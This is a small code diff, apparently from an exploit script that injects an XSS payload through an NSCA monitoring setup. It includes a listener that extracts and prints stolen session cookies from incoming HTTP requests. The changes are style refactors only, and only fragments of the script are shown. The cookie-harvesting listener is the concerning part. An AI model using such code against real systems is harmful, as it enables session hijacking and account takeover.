@@ -72,7 +72,7 @@ def main(target, hostname, config_path, xss_payload):
                   '      - the server firewall to ensure the traffic is allowed\n'
                   '      - the nsca process is running on the server and listening on 5667 (not on localhost only).')
 
-        print(f'[!] Non-empty stderr, exiting...')
+        print('[!] Non-empty stderr, exiting...')
         exit(1)
 
 
@@ -127,9 +127,8 @@ if __name__ == "__main__":
         client_data = client_sock.recv(9000)
 
         cookie_string = ''
-        match = re.search(b'GET \/\?([^ ]*) ', client_data)
-        if match:
-            cookie_string = match.group(1).decode()
+        if match := re.search(b'GET \/\?([^ ]*) ', client_data):
+            cookie_string = match[1].decode()
         if cookie_string:
             print(f'[+] Session cookie found: "{cookie_string}"')
         else:
